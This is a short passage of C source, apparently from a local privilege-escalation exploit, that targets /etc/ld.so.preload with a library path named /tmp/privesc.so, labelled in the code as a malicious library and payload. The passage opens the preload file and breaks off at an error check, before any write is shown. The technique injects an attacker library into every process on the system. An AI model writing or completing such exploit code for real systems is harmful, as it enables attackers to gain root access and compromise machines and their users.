    const char* ld_preload_path = "/etc/ld.so.preload";
    const char* malicious_library_path = "/tmp/privesc.so"; // Assuming it's here
    size_t payload_len = strlen(malicious_library_path);

    int ld_preload_fd = open(ld_preload_path, O_RDONLY); // Open read-only
    if (ld_preload_fd == -1) {
